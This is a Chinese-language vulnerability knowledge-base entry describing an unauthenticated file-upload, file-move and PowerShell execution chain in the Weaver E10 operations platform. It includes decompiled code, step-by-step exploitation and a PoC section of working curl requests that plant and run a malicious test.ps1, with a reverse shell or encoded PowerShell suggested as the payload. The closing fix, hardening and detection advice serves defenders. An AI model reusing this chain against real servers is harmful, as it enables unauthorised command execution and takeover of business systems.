---
id: web-generic-file-upload-weaver-e10-upload-move-updatemaster-powershell-rce
title: 泛微 E10 运维平台未授权上传 PS1 + ms_tools_mv_lib 移动 + updateMaster 触发 PowerShell RCE
type: scenario
domain: web
path: web/generic/file-upload
technique: weaver-e10-upload-move-updatemaster-powershell-rce
tags:
- java
- spring
- file-upload
- arbitrary-file-write
- powershell
- rce
- weaver
- ecology
- e10
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V222
  verified_at: '2026-11-07T06:44:37+08:00'
  notes: 已对照原文 InstallMicroService.uploadRules 反编译、ms_tools_mv_lib 说明、MasterMonitorService.updateMaster 反编译截图核对：上传 rules、版本比较移动 test.ps1、updateMaster 拼 powershell.exe test.ps1 均成立；文末远程截图未本地留存，未实际执行 PoC。
url: /docs/web/generic/file-upload/web-generic-file-upload-weaver-e10-upload-move-updatemaster-powershell-rce/
draft: false
kb_aliases:
- 泛微 E10 前台 RCE
- e-monitor 上传 getshell
- rc_uploadRules 任意上传
- ms_tools_mv_lib 文件移动
- updateMaster PowerShell
---

## 一句话结论

泛微 E10 运维平台通过 `/sapi/bs/**` 白名单绕过鉴权后，可先用未授权的 `/cu/uploadFiles/rc_uploadRules.json` 把任意内容（如 `test.ps1`）上传到 `e-monitor/app/update/rules/`，再用 `/sapi/bs/ms_tools_mv_lib.json` 的文件移动功能把脚本移动到 `e-monitor/`，最后 `/sapi/bs/updateMaster.json` 触发 `powershell.exe <monitorDir>/test.ps1`，形成前台未授权命令执行。

## 原理

- **上传**：`/cu/uploadFiles/rc_uploadRules.json` 由 `ServerControl` 分发给 `InstallMicroService.uploadRules`：
  ```java
  String name = file.getOriginalFilename();
  String rulePath = getMonitorPath() + File.separator + "app" + File.separator + "update" + File.separator ...;
  FileUtil.uploadFile(request, rulePath);
  String sourceFilePath = rulePath + name.replace("zip", "");
  ZipUtil.unzip(rulePath, name);
  ```
  代码不校验扩展名，`name` 原样落盘；虽然 `ZipUtil.unzip(rulePath, name)` 的参数写反导致 ZIP 自解压失败，但普通文件（`test.ps1`）已经写入 `app/update/rules/`。
- **移动**：`/sapi/bs/ms_tools_mv_lib.json` 的 `mvLib` 按文件名中的版本信息比较，选出高版本文件后从列表删除，最终把剩余文件从 `libPath` 移动到 `targetPath`。文章上传 `test.ps1` 与 `test.ps2`，使较高版本被排除后 `test.ps1` 被移动到 `e-monitor/` 根目录。
- **触发**：`/sapi/bs/updateMaster.json` 进入 `MonitorMasterControl.updateMaster` → `MasterMonitorService.updateMaster`：
  ```java
  String[] split1 = batchUpdateReq.getFileName().split("e-monitor-master-update-");
  String[] split2 = split1[1].split(".zip");
  ...
  if (SystemUtils.IS_OS_WINDOWS) {
      String command = "powershell.exe " + masterMonitor.getMonitorDir() + "/test.ps1";
      ProcessBuilder builder = new ProcessBuilder(new String[]{"cmd.exe", "/c", command});
      ...
  }
  ```
  `getMonitorDir()` 下固定拼 `test.ps1`，因此攻击者只要把同名脚本移动到该目录，就能让服务器以运维平台进程权限执行任意 PowerShell。
- 三个接口均落在 `/sapi/bs/**` 或 `/cu/uploadFiles/**` 白名单内，全程未授权。
- 绝对路径可通过 `/sapi/bs/getMonitorOperationLogs.json` 的日志回显获取。

## 触发条件

- 目标为泛微 E10 运维管理平台（e-monitor，文章测试 Ecology10.0.2403.01，Windows 部署）。
- `/cu/uploadFiles/**` 与 `/sapi/bs/**` 未被网关拦截（默认在鉴权白名单内）。
- 运维平台进程对 `e-monitor/app/update/rules/` 与 `e-monitor/` 有写权限（安装目录默认如此）。
- 能获取或推测 `getMonitorPath()`（例如 `D:/nettools/.../ecology/e-monitor/`）。

## 利用步骤

1. POST `/sapi/bs/getMonitorOperationLogs.json`（body `{"currentPage":1,"pageSize":20,"searchInput":""}`）从日志中获取运维平台绝对路径。
2. 向 `/cu/uploadFiles/rc_uploadRules.json` 上传两个同名不同版本的文件：`test.ps1`（恶意 PowerShell）与 `test.ps2`（任意内容），multipart 字段名 `file`。
3. POST `/sapi/bs/ms_tools_mv_lib.json`，`libPath` 指向 `.../e-monitor/app/update/rules/`，`targetPath` 指向 `.../e-monitor/`，触发 `test.ps1` 移动。
4. POST `/sapi/bs/updateMaster.json`，`fileName` 形如 `e-monitor-master-update-7`，触发 `powershell.exe <monitorDir>/test.ps1`。
5. 脚本执行（如 `Start-Process calc.exe` 或反向 shell），验证命令执行。

## PoC

```bash
# 1) 上传恶意 PS1 与用于版本比较的 PS2
curl -s -k -X POST 'http://target:9081/cu/uploadFiles/rc_uploadRules.json' \
  -F 'file=@test.ps1;filename=test.ps1;type=application/x-zip-compressed'

curl -s -k -X POST 'http://target:9081/cu/uploadFiles/rc_uploadRules.json' \
  -F 'file=@test.ps2;filename=test.ps2;type=application/x-zip-compressed'

# 2) 把 test.ps1 从 rules 目录移动到 e-monitor 根目录
curl -s -X POST 'http://target:9081/sapi/bs/ms_tools_mv_lib.json' \
  -H 'Content-Type: application/json' \
  -d '{"ip":"127.0.0.1","libPath":"D:/path/ecology/e-monitor/app/update/rules/","targetPath":"D:/path/ecology/e-monitor/"}'

# 3) 触发 updateMaster，执行 monitorDir/test.ps1
curl -s -X POST 'http://target:9081/sapi/bs/updateMaster.json' \
  -H 'Content-Type: application/json' \
  -d '{"targetPage":"7","fileName":"e-monitor-master-update-7","ipList":"7","percentMax":"7","updateStatus":"7"}'
```

`test.ps1` 示例：`Start-Process calc.exe` 或 `powershell -e <base64>`。

## 变体与关联

- **上传点变体**：`/cu/uploadFile/rc_uploadBatchServer.json` 同样无扩展名校验，落盘到 `e-monitor/app/batchServer/`；文件名中的 `../` 会被 `getOriginalFilename()` 处理掉，但可用于放置其它恶意文件。
- **直接移动**：若 `ms_tools_mv_lib.json` 的 `libPath` 可控且能指向任意目录，可移动已有文件；配合任意上传即形成通用“上传+移动”组合。
- **关联**：[[web-java-framework-spring-weaver-e10-sapi-bs-wildcard-auth-bypass-admin]]（同一白名单绕过，提供未授权入口）、[[web-generic-file-upload-icpas-uploadjson-path-traversal-arbitrary-write]]（另一产品的任意写 webshell，可对比落盘位置与触发方式）。

## 检测与防御

- **修复**：上传接口强制扩展名白名单（仅允许规则/媒体文件）并随机重命名；`app/update/rules` 等目录禁止脚本执行；`ms_tools_mv_lib.json` 限制 `libPath`/`targetPath` 在固定目录内并校验文件类型；`updateMaster` 只执行签名校验过的官方脚本。
- **加固**：`/sapi/bs/**`、`/cu/uploadFiles/**` 必须鉴权并做操作白名单；运维平台限制来源 IP；服务进程最小权限。
- **检测**：监控 `rc_uploadRules.json` 上传 `.ps1`/`.bat`/`.exe` 等可执行文件、`ms_tools_mv_lib.json` 跨目录移动、`updateMaster.json` 触发的 `powershell.exe` 子进程与脚本创建行为。
